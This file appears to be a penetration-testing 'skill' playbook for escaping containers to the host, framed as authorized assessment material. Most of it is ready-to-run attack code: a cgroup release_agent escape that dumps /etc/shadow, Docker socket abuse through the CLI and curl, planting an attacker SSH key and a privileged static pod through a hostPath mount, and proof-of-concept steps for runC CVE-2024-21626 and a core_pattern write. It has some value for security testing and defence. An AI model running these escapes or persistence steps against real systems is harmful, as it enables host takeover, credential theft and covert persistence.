---
name: escaping-containers-to-host
description: Exploit privileged pods, host mounts, runC CVEs, and exposed Docker sockets to break out of a container and reach the underlying host during authorized container-security assessments.
domain: cybersecurity
subdomain: container-security
tags:
- container-escape
- privileged-container
- runc-cve
- docker-socket
- host-mount
- kubernetes
- privilege-escalation
- breakout
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.PS-01
mitre_attack:
- T1611
---
# Escaping Containers to Host

> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Container breakout grants full host compromise. Only run these techniques against systems you own or have explicit written authorization to test. Unauthorized use is illegal and may violate computer fraud laws.

## Overview

Container escape (MITRE ATT&CK T1611, Escape to Host) is the act of breaking the isolation boundary between a container and the host operating system, giving an attacker code execution in the host namespace — and, on Kubernetes, frequently a route to the entire node and then the cluster. Containers share the host kernel and rely on namespaces, cgroups, capabilities, seccomp, and LSMs (AppArmor/SELinux) for isolation. When any of these controls are weakened (a `--privileged` container, a mounted Docker socket, a `hostPath` mount of `/`, excess Linux capabilities such as `CAP_SYS_ADMIN`) or when a runtime contains a vulnerability, that boundary collapses.

This skill covers the four highest-impact, real-world escape primitives observed by Sysdig, Unit 42, and the runC maintainers:

1. **Misconfiguration escapes** — privileged containers, `CAP_SYS_ADMIN`, host PID/IPC/Network namespaces, and `hostPath` mounts.
2. **Exposed Docker socket** (`/var/run/docker.sock`) — mounting the daemon socket into a container hands an attacker root on the host via a new privileged container.
3. **The "Leaky Vessels" runC fd leak, CVE-2024-21626** — runC leaks an internal file descriptor (`/proc/self/fd/7`/`8`) referencing the host filesystem before `pivot_root`; setting the container working directory to that fd lands the process on the host. Patched in runC 1.1.12 (containerd 1.6.28/1.7.13, Docker 25.0.2).
4. **The November 2025 runC procfs write-redirect family — CVE-2025-31133, CVE-2025-52565, CVE-2025-52881** — race/symlink abuse of the `/dev/null`, `/dev/console`, and other bind mounts performed *before* runC applies `maskedPaths`/`readonlyPaths`, allowing read-write access to `/proc` entries (e.g. `/proc/sysrq-trigger`, `core_pattern`) and arbitrary write redirection. Patched in runC 1.2.8, 1.3.3, and 1.4.0-rc.3.

Sources: Palo Alto Networks "Leaky Vessels" advisory; Sysdig "New runc vulnerabilities allow container escape" (2025); opencontainers/runc security advisories GHSA-cgrx-mc8f-2prm and GHSA-9493-h29p-rfm2; Unit 42 container-escape research.

## When to Use

- During an authorized container or Kubernetes penetration test after obtaining initial code execution inside a container or pod
- When validating that runtime defenses (Falco, seccomp, AppArmor) detect or block breakout attempts
- When assessing the blast radius of a compromised microservice
- When verifying patch levels of runC/containerd/Docker against the CVEs above

## Prerequisites

- Authorization (signed rules of engagement) covering host/node compromise
- A foothold: a shell inside a target container
- Reconnaissance utilities inside the container or staged in:
  ```bash
  # deepce - Docker enumeration and escape
  git clone https://github.com/stealthcopter/deepce.git
  # amicontained - container introspection (capabilities, seccomp, namespaces)
  curl -L https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64 -o amicontained
  chmod +x amicontained
  # CDK - zero-dependency K8s/container pentest toolkit
  curl -L https://github.com/cdk-team/CDK/releases/latest/download/cdk_linux_amd64 -o cdk
  chmod +x cdk
  ```
- A lab cluster/host you are permitted to break out of (e.g., kind, minikube, or a dedicated VM)

## Objectives

- Enumerate the container's privilege posture (capabilities, namespaces, mounts, seccomp)
- Identify which escape primitive is available
- Execute a host breakout and prove host-level code execution
- Capture evidence (host hostname, host `/etc/shadow` access, or a host file write)
- Document the root-cause misconfiguration or vulnerable runtime version for remediation

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|--------------|------|--------|
| T1611 | Escape to Host | Privilege Escalation |
| T1610 | Deploy Container | Defense Evasion / Execution |
| T1613 | Container and Resource Discovery | Discovery |
| T1068 | Exploitation for Privilege Escalation | Privilege Escalation |

## Workflow

### Step 1: Enumerate the Container Environment

Determine privilege level, capabilities, namespaces, and mounted host paths.

```bash
# Quick capability + namespace + seccomp introspection
./amicontained

# Are we privileged? CapEff ending in ...ffffffff is "all caps"
grep CapEff /proc/self/status
capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}')

# Host filesystem or docker socket mounted in?
mount | grep -E 'docker.sock|hostPath|/host'
ls -la /var/run/docker.sock 2>/dev/null
findmnt -o TARGET,SOURCE,FSTYPE,OPTIONS

# Sharing host namespaces? (host PID = can see host processes)
ps aux | head        # if you see systemd/host pids, hostPID:true
ls -la /proc/1/root  # if readable as host root, namespace is shared

# Automated enumeration
./deepce.sh
./cdk evaluate
```

### Step 2: Escape via a Privileged Container (cgroup release_agent)

A `--privileged` container (or one with `CAP_SYS_ADMIN`) can mount a cgroup hierarchy and abuse the `release_agent` to run a command on the host when the last process in a cgroup exits.

```bash
# Confirm we can mount (CAP_SYS_ADMIN present)
# Create a cgroup mount and enable release_agent notification
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || \
  mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# Find the container rootfs path on the host
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Payload that runs on the HOST
cat > /cmd <<'EOF'
#!/bin/sh
ps aux > /output
hostname >> /output
cat /etc/shadow >> /output
EOF
chmod +x /cmd

# Trigger: spawn and immediately exit a process in the cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output   # host process list / shadow proves escape
```

### Step 3: Escape via a Mounted Docker Socket

If `/var/run/docker.sock` is bind-mounted into the container, you control the host Docker daemon and can launch a new container that mounts the host root.

```bash
# Confirm reachability
docker -H unix:///var/run/docker.sock version 2>/dev/null || \
  curl -s --unix-socket /var/run/docker.sock http://localhost/version

# Launch a privileged container mounting host / and chroot into it
docker -H unix:///var/run/docker.sock run -it --rm \
  --privileged --net=host --pid=host \
  -v /:/host alpine chroot /host sh

# Pure-curl variant (no docker CLI in container):
curl -s -XPOST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],
       "Binds":["/:/host"],"Privileged":true}' \
  http://localhost/containers/create?name=esc
curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/esc/start
```

### Step 4: Escape via a hostPath Mount (Kubernetes)

A pod with a `hostPath` volume of `/` (or a sensitive host dir) lets you read/write host files directly — e.g., drop a root SSH key or a privileged static pod manifest.

```bash
# If /host is the hostPath mount of node root:
ls /host
# Persist: add an attacker key for node root login
mkdir -p /host/root/.ssh
echo "ssh-ed25519 AAAA... attacker@kali" >> /host/root/.ssh/authorized_keys

# Or write a privileged static pod manifest that kubelet will auto-run as root
cat > /host/etc/kubernetes/manifests/pwn.yaml <<'EOF'
apiVersion: v1
kind: Pod
metadata: {name: pwn, namespace: kube-system}
spec:
  hostPID: true
  containers:
  - name: pwn
    image: alpine
    command: ["/bin/sh","-c","sleep 1d"]
    securityContext: {privileged: true}
    volumeMounts: [{name: host, mountPath: /host}]
  volumes: [{name: host, hostPath: {path: /}}]
EOF
```

### Step 5: Exploit runC CVE-2024-21626 (Leaky Vessels fd leak)

If the runtime is runC <= 1.1.11, the leaked host-cwd fd can be used. With `docker build`/`docker run` control, set the working directory to `/proc/self/fd/<N>` (commonly 7 or 8).

```bash
# Detect vulnerable runtime version (host or via runc binary in image)
runc --version          # vulnerable: 1.0.0-rc93 .. 1.1.11
docker info --format '{{.DefaultRuntime}}'

# Proof-of-concept via a malicious image WORKDIR (run-time variant)
cat > Dockerfile <<'EOF'
FROM alpine
# fd 7/8 leaked by runc references the HOST cwd before pivot_root
WORKDIR /proc/self/fd/8
RUN ["/bin/sh","-c","cd ../../../../ ; cat etc/shadow ; cat etc/hostname"]
EOF
docker build --no-cache -t leaky .

# Run-time variant: the container lands in a host directory
docker run --rm --workdir /proc/self/fd/8 alpine \
  sh -c 'cd ../../../.. && cat etc/shadow'
# Reference PoC: github.com/strikoder/cve-2024-21626-runc-1.1.11-escape
```

### Step 6: Exploit the 2025 runC procfs Write-Redirect Family

For runC <= 1.2.7 / 1.3.2 / 1.4.0-rc.2, CVE-2025-31133/52565/52881 abuse a race between the `/dev/null`/`/dev/console` bind mount and the application of `maskedPaths`, replacing the mount target with a symlink so a host `/proc` entry becomes writable. Writing `core_pattern` or `/proc/sysrq-trigger` yields host code execution.

```bash
# Confirm vulnerable runtime
runc --version   # vulnerable: <= 1.2.7, 1.3.2, 1.4.0-rc.2

# Conceptual exploitation flow (use maintainers' PoC in a lab):
#  1. Start a container that, during init, swaps the /dev/console (or a
#     custom device) bind-mount target for a symlink to /proc/sysrq-trigger.
#  2. Win the race so runc bind-mounts it read-write before maskedPaths apply.
#  3. Redirect a write to host procfs:
echo c > /proc/sysrq-trigger     # would crash host (DoS) - demonstrates RW
#  4. For code exec, redirect the write to /proc/sys/kernel/core_pattern:
echo '|/bin/sh -c "id>/host_pwn"' > /proc/sys/kernel/core_pattern
#     then trigger a core dump in any host-visible process.
# Advisories: GHSA-cgrx-mc8f-2prm, GHSA-9493-h29p-rfm2
```

### Step 7: Validate the Patched State and Document Remediation

```bash
# Verify runtimes are patched
runc --version              # want >= 1.2.8 / 1.3.3 / 1.4.0-rc.3 (and != vuln 1.1.x)
docker version --format '{{.Server.Version}}'   # >= 25.0.2 for CVE-2024-21626
containerd --version        # >= 1.6.28 / 1.7.13

# Confirm hardening for misconfig escapes
docker inspect <ctr> --format '{{.HostConfig.Privileged}}'   # want false
kubectl get pod <pod> -o jsonpath='{.spec.containers[*].securityContext}'
```

## Tools and Resources

| Tool | Purpose | Source |
|------|---------|--------|
| amicontained | Capability/namespace/seccomp introspection | https://github.com/genuinetools/amicontained |
| deepce | Docker enumeration & escape automation | https://github.com/stealthcopter/deepce |
| CDK | Container/K8s penetration toolkit | https://github.com/cdk-team/CDK |
| runc PoC (CVE-2024-21626) | Leaky Vessels reference exploit | https://github.com/strikoder/cve-2024-21626-runc-1.1.11-escape |
| Sysdig runc 2025 advisory | CVE-2025-31133/52565/52881 analysis | https://www.sysdig.com/blog/runc-container-escape-vulnerabilities |
| Palo Alto Leaky Vessels | CVE-2024-21626 deep dive | https://www.paloaltonetworks.com/blog/cloud-security/leaky-vessels-vulnerabilities-container-escape/ |

## Escape Primitive Reference

| Primitive | Root Cause | Detection Signal |
|-----------|-----------|------------------|
| Privileged container | `--privileged` / `CAP_SYS_ADMIN` | `mount` of cgroup, write to `release_agent` |
| Docker socket mount | `/var/run/docker.sock` bind-mounted | Daemon API call from a container |
| hostPath `/` mount | Pod mounts node root | Write to `/host/etc/kubernetes/manifests` |
| CVE-2024-21626 | runC fd leak before pivot_root | WORKDIR/cwd `=/proc/self/fd/N` |
| CVE-2025-31133/52565/52881 | procfs write redirect via mount race | RW mount of `/dev/console`, write to `/proc/sysrq-trigger` |

## Validation Criteria

- [ ] Container privilege posture enumerated (caps, namespaces, mounts, seccomp)
- [ ] Available escape primitive correctly identified
- [ ] Host-level code execution demonstrated (host hostname / `/etc/shadow` / host file write captured)
- [ ] Root-cause misconfiguration or vulnerable runtime version recorded
- [ ] runC/containerd/Docker versions checked against CVE patch baselines
- [ ] Remediation guidance (drop privileges, remove socket mount, patch runtime) documented
- [ ] All actions stayed within the authorized scope
